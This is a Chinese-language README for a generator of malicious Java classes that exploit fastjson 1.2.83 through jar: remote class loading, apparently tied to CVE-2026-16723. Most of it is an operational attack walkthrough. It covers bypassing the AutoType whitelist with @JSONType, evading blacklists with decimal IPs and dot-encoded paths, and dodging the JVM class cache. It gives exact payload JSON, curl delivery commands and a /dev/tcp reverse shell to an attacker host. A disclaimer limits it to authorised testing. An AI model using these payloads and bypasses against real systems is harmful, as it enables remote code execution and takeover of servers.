# FastJson 1.2.83 GenProbe2

> **用途：CVE-2026-16723 漏洞复现使用。**
> 本仓库是 fastjson 1.2.83 `jar:` 远程类加载链的**恶意类生成器**（造弹器）——用 ASM 在运行时生成一个带 `@JSONType` 注解、`<clinit>` 里执行任意命令的类，配合 CVE-2026-16723 靶场（Spring Boot + fastjson 1.2.83）完成从"发 payload"到"命令落地"的完整复现。
> 仅用于授权环境下的漏洞验证与防御研究。

## 这个文件干什么

`GenProbe2.java` 不是漏洞利用本体，而是生成 payload 的第一步：它输出 `POC.class`，你把它打成**无扩展名的 jar 文件**放到 HTTP 服务器上，再让目标 fastjson 反序列化一个指向该 jar 的类名，目标 JVM 就会通过 `jar:` 协议远程下载并加载 `POC`，触发静态块。

生成出来的类有三处刻意设计，每一处对应绕过/规避一个真实卡点：

| 生成物特征 | 作用 |
|---|---|
| 类级注解 `@com.alibaba.fastjson.annotation.JSONType(orders = {"x"})` | 让 fastjson 的注解扫描阶段把该类判定为 `hasJsonType`，**绕过 AutoType 白名单校验**（1.2.83 默认关闭 autoType，带 `@JSONType` 的类走另一条放行分支） |
| `static {}`（`<clinit>`）里 `Runtime.getRuntime().exec(new String[]{"bash","-c",CMD})` | 类加载即执行。用 `String[]` 形式调 `exec`，等价于 `bash -c CMD`，所以 CMD 里管道、重定向、`$()`、反弹 shell 等任意 bash 语法都成立（不受 `exec(String)` 分词限制） |
| 内部类名 = `jar:http://IP:PORT/<jarName>!/<entryName>`（带 `:` `/` `!` 的 URL） | 每次换 `jarName`/`entryName`（如 `probe2`/`POC2`）内部类名就变成全新字符串，**绕过 JVM 同名类缓存**——目标服务不用重启就能反复换命令打 |

ASM 不校验 `visit` 的类名合法性，`ClassWriter.COMPUTE_FRAMES` 负责算栈帧，异常表把整个命令执行块包起来（`catch (Exception) {}`），保证 `exec` 失败也不会让加载方抛错暴露。

## 漏洞复现完整流程（CVE-2026-16723）

### 0. 角色与前置

| 角色 | 占位 | 说明 |
|---|---|---|
| 攻击机 | `ATTACK_IP` / 十进制 `ATTACK_IP_DEC` | 托管恶意 jar、发 payload |
| 靶机 | `TARGET:8080` | Spring Boot + fastjson 1.2.83 |
| 靶场 jar | `fastjson-cve202616723-0.0.1-SNAPSHOT.jar` | 必须是**已打补丁版**（`ParserConfig.getGlobalInstance().setDefaultClassLoader(...)`） |

`ATTACK_IP_DEC` 是攻击机 IP 的十进制整数（`192.168.1.1` → `3232235777`），用十进制可避开 IP 字面量黑名单。

### 1. 写要执行的命令

生成器工作目录下建 `cmd.txt`，**第一行**即要执行的命令（生成器用 `bash -c` 执行，支持 `|`、`>`、`$()`、反弹 shell）。先做最小验证：

```bash
touch /tmp/CUSTOM_RCE_$(whoami)
```

以 `#` 开头的行被跳过；没有 `cmd.txt` 时默认 `touch /tmp/PWNED_CVE-2026-16723`。

### 2. 生成恶意 class（需要 asm）

```powershell
# 用法: java GenProbe2 <IP十进制> <端口> <输出目录> [jar名] [类名]
java -cp ".;lib\asm-9.6.jar" GenProbe2 ATTACK_IP_DEC 8888 out probe POC
```

产出 `out\POC.class`，内部类名 = `jar:http://ATTACK_IP:8888/probe!/POC`，控制台会打印"将执行命令"。

### 3. 打成无扩展名的 jar，放进 HTTP 根目录

```powershell
cd out
jar cvf ..\probe POC.class
```

三个硬要求：

- 远程文件名**必须没有扩展名**：叫 `probe`，不能叫 `probe.jar`；
- 它必须是**一个文件**，不能是同名文件夹（文件夹会 301 跳成 HTML，解析失败）；
- jar 内条目名（`POC.class`）与生成时的 `entryName` 一致。

### 4. 开 HTTP 服务并自检

```bash
python -m http.server 8888      # 根目录 = 存放 probe 的目录，保持运行
curl.exe -s -o NUL -w "%{http_code} %{size_download}\n" http://localhost:8888/probe   # 本机
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://ATTACK_IP:8888/probe # 靶机侧
```

两边都要看到 `200` 和正确字节数，再往下走。

### 5. 启动靶场（靶机，前台）

```bash
java -jar fastjson-cve202616723-0.0.1-SNAPSHOT.jar
# 看到 Tomcat started on port(s): 8080 后保持窗口不动
```

### 6. 发送 payload

**最大的坑：PowerShell 会吃掉 JSON 双引号**，直接 `-d '{"@type":...}'` 会变成 `{@type:...}`，靶机回 `illegal identifier : @pos 1`，**根本走不到下载 jar 那一步**（HTTP 窗口一个请求都看不到）。

正确做法：payload 存文件，用 `--data-binary "@文件"`。`payload.json`：

```json
{"@type":"jar:http:..ATTACK_IP_DEC:8888.probe!.POC","x":1}
```

注意这里的写法：**点号代替斜杠和 `.class`** —— `jar:http:..IP:PORT.jar名!.类名` 是合法 JSON，用于绕黑名单；fastjson 还原成资源路径 `jar:http://IP:PORT/probe!/POC.class` 后走 `ClassLoader.getResourceAsStream()` 下载。

```powershell
curl.exe -s -X POST http://TARGET:8080/api/products/search `
  -H "Content-Type: application/json" `
  --data-binary "@payload.json"
```

返回 `parse ok` = fastjson 解析成功（**不等于命令执行成功**，见第 7 步）。

### 7. 验证（靶机）

```bash
ls -la /tmp/ | grep CUSTOM_RCE     # 期望 /tmp/CUSTOM_RCE_<user>
```

同时攻击机 HTTP 窗口会出现 `GET /probe`（通常 2 次：一次注解扫描、一次真正加载）。无回显命令只能靠"落地文件 / 回连 / 反弹 shell"证明执行成功。

### 8. 换命令 / 换端口 / 多次利用

**JVM 对同名类只加载一次，`<clinit>` 只跑一次**，同名再次请求命中缓存。两个办法：

- **A（不用重启靶场）**：改 `cmd.txt`，用新的 `jar名`+`类名` 重新生成（如 `p2`/`POC2`），打包、放置，payload 改成 `{"@type":"jar:http:..ATTACK_IP_DEC:8888.p2!.POC2","x":1}`；
- **B**：重启靶场，类缓存清空，原 `probe` 可重新触发。

换端口（8888↔8889）时**三处一起改**：生成 class 的端口参数、payload 里的端口、HTTP 服务实际端口。

### 9. 反弹 shell（进阶）

`cmd.txt` 第一行：

```bash
bash -i >& /dev/tcp/ATTACK_IP/9999 0>&1
```

攻击机监听（Windows 无 nc，用 WSL `nc -lvnp 9999`），然后按第 2~6 步重新生成、部署、发送（建议换新类名）。

### 铁律：三处必须完全一致

1. class 字节码里的内部类名（`GenProbe2` 生成时焊死）；
2. payload `@type` 还原后的字符串；
3. HTTP 服务的**端口**和**文件名**。

任何一处不一致 → 类名对不上、加载失败（表现为 HTTP 窗口无请求，或 8888 能访问但没触发）。

### 常见问题速查

| 现象 | 原因 | 处理 |
|---|---|---|
| `illegal identifier : @pos 1` | PowerShell 吃了 JSON 双引号 | `--data-binary "@payload.json"` 文件方式 |
| HTTP 窗口没有任何请求 | 同上，首个字段就解析失败 | 同上 |
| `autoType is not support` | 靶场是未打补丁版（无 `setDefaultClassLoader`） | 换补丁版 jar |
| HTTP 能访问但没触发 | class 内部类名端口与实际不符 | 用对应端口重新生成 class |
| 第二次没反应 | 同名类缓存，`clinit` 只跑一次 | 换 jar 名/类名，或重启靶场 |
| 301 / 下载到 HTML | `probe` 做成了文件夹 | `jar cvf probe POC.class` 打成无扩展名文件 |
| `parse ok` 但没效果 | 命令写法问题（单字符串 `exec` / 未走 `bash -c`） | 用本生成器（已是 `exec` 数组 + `bash -c`） |
| 换机器/IP 不生效 | IP 十进制、payload、class 内 IP 三处不同步 | 重算十进制并重新生成 |

## 文件

| 文件 | 说明 |
|---|---|
| `GenProbe2.java` | 生成器源码（ASM 直接写字节码，无反射、无模板） |
| `GenProbe2.class` | 上面源码的编译产物，可直接 `java GenProbe2 ...` 运行（仍需 `asm.jar` 在 classpath） |

依赖：`org.objectweb.asm`（`ClassWriter` / `MethodVisitor` / `AnnotationVisitor` / `Label`），实测 ASM 9.6。

## 关联 CVE

**CVE-2026-16723** —— fastjson 1.2.83 在特定条件下 AutoType 白名单判定不严，`@JSONType` 注解类可在未开启 `autoTypeSupport` 时被实例化/加载，配合 `jar:` 远程类加载形成 JNDI 注入 → 远程代码执行。本工具负责产出该链路上的"远程恶意类"这一步。
